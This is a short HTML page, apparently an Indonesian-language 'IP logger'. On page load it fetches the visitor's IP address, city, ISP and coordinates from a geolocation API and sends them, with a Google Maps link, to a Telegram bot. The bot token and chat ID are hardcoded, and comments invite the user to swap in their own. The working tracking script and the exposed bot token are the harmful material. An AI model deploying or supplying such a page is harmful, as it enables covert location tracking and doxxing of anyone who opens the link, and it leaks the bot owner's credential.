<!DOCTYPE html>
<html>
<head>
  <title>IP & Lokasi Visitor + Telegram</title>
</head>
<body>
  <h2>📡 Sedang Mengambil Info Lokasi Anda...</h2>
  <p id="info">Mohon tunggu sebentar...</p>
  <div id="map" style="margin-top: 20px;"></div>

  <script>
    const botToken = '8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY'; // 🔁 Ganti dengan token bot kamu
    const chatId = '7600526426';     // 🔁 Ganti dengan chat ID kamu

    // Fungsi kirim ke Telegram
    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(response => {
        if (response.ok) {
          console.log("✅ Terkirim ke Telegram");
        } else {
          console.error("❌ Gagal kirim ke Telegram");
        }
      });
    }

    // Ambil data dari IPAPI
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const city = data.city;
        const region = data.region;
        const country = data.country_name;
        const org = data.org;
        const timezone = data.timezone;
        const latitude = data.latitude;
        const longitude = data.longitude;
        const now = new Date().toLocaleString();

        const message = `🌍 Pengunjung Baru:

📡 IP: ${ip}
🏙️ Kota: ${city}
🗺️ Wilayah: ${region}
🌐 Negara: ${country}
📍 Koordinat: ${latitude}, ${longitude}
🏢 ISP: ${org}
🕒 Waktu Akses: ${now}
⏱ Zona Waktu: ${timezone}
🗺️ Google Maps: https://www.google.com/maps?q=${latitude},${longitude}`;

        document.getElementById("info").innerText = message;

        // Tampilkan Google Maps di halaman
        const mapFrame = document.createElement('iframe');
        mapFrame.width = "100%";
        mapFrame.height = "400";
        mapFrame.style.border = "0";
        mapFrame.loading = "lazy";
        mapFrame.allowFullscreen = true;
        mapFrame.referrerPolicy = "no-referrer-when-downgrade";
        mapFrame.src = `https://www.google.com/maps?q=${latitude},${longitude}&z=12&output=embed`;
        document.getElementById("map").appendChild(mapFrame);

        // Kirim ke Telegram sekarang
        sendToTelegram(message);
      })
      .catch(err => {
        console.error("Gagal ambil lokasi:", err);
        document.getElementById("info").innerText = "Gagal ambil lokasi.";
      });
  </script>
</body>
</html>
